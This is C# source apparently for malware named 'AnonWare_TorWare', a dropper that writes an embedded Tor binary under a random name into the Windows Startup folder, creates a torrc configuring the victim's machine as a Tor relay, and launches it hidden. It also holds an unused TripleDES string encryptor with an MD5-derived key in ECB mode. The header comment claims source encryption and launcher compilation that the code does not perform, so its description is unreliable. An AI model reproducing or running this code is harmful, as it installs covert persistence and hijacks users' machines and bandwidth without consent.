//the 'first launcher' encrypts the source code, compiles the launcher code, moves the launcher to the startup directory, and finally runs the launcher.

using System;
using System.Text;
using System.Security.Cryptography;
using Microsoft.CSharp;
using System.Diagnostics;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.Linq;
using System.IO;
using System.Net;

namespace AnonWare_TorWare
{
    class Program
    {
        public static void Main(string[] args)
        {
            string myAssemblyName = GetPassword() + ".exe";
            FileStream outputFile = new FileStream(Environment.GetEnvironmentVariable("appdata") + @"\Microsoft\Windows\Start Menu\Programs\Startup\" + myAssemblyName, FileMode.Create);
            outputFile.Write(AnonWare_CSharp.Properties.Resources.tor, 0, (int) AnonWare_CSharp.Properties.Resources.tor.Length);
            outputFile.Close();
            StreamWriter torcc = new StreamWriter(Environment.GetEnvironmentVariable("appdata") + @"\tor\" + "torrc");
            torcc.WriteLine("ContactInfo anonware");
            torcc.WriteLine("ControlPort 9051");
            torcc.WriteLine("DirPort 9030");
            torcc.WriteLine("Log notice stdout");
            torcc.WriteLine("Nickname " + "trwr" + GetPassword());
            torcc.WriteLine("ORPort 443");
            torcc.WriteLine("SocksListenAddress 127.0.0.1");
            torcc.Close();
            Process cmd = new Process();
            cmd.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            cmd.StartInfo.Arguments = "--quiet";
            cmd.StartInfo.FileName = Environment.GetEnvironmentVariable("appdata") + @"\Microsoft\Windows\Start Menu\Programs\Startup\" + myAssemblyName;
            cmd.Start();
        }
        public static string GetPassword()
        {
            StringBuilder builder = new StringBuilder();
            builder.Append(RandomString(4, true));
            builder.Append(RandomNumber(1000, 9999));
            builder.Append(RandomString(2, false));
            return builder.ToString();
        }
        private static int RandomNumber(int min, int max)
        {
            Random random = new Random();
            return random.Next(min, max);
        }
        private static string RandomString(int size, bool lowerCase)
        {
            StringBuilder builder = new StringBuilder();
            Random random = new Random();
            char ch;
            for (int i = 0; i < size; i++)
            {
                ch = Convert.ToChar(Convert.ToInt32(Math.Floor(26 * random.NextDouble() + 65)));
                builder.Append(ch);
            }
            if (lowerCase)
                return builder.ToString().ToLower();
            return builder.ToString();
        }
        public static string EncryptString(string Message, string Passphrase)
        {
            byte[] Results;
            System.Text.UTF8Encoding UTF8 = new System.Text.UTF8Encoding();

            // Step 1. We hash the passphrase using MD5
            // We use the MD5 hash generator as the result is a 128 bit byte array
            // which is a valid length for the TripleDES encoder we use below

            MD5CryptoServiceProvider HashProvider = new MD5CryptoServiceProvider();
            byte[] TDESKey = HashProvider.ComputeHash(UTF8.GetBytes(Passphrase));

            // Step 2. Create a new TripleDESCryptoServiceProvider object
            TripleDESCryptoServiceProvider TDESAlgorithm = new TripleDESCryptoServiceProvider();

            // Step 3. Setup the encoder
            TDESAlgorithm.Key = TDESKey;
            TDESAlgorithm.Mode = CipherMode.ECB;
            TDESAlgorithm.Padding = PaddingMode.PKCS7;

            // Step 4. Convert the input string to a byte[]
            byte[] DataToEncrypt = UTF8.GetBytes(Message);

            // Step 5. Attempt to encrypt the string
            try
            {
                ICryptoTransform Encryptor = TDESAlgorithm.CreateEncryptor();
                Results = Encryptor.TransformFinalBlock(DataToEncrypt, 0, DataToEncrypt.Length);
            }
            finally
            {
                // Clear the TripleDes and Hashprovider services of any sensitive information
                TDESAlgorithm.Clear();
                HashProvider.Clear();
            }

            // Step 6. Return the encrypted string as a base64 encoded string
            return Convert.ToBase64String(Results);
        }
    }
}
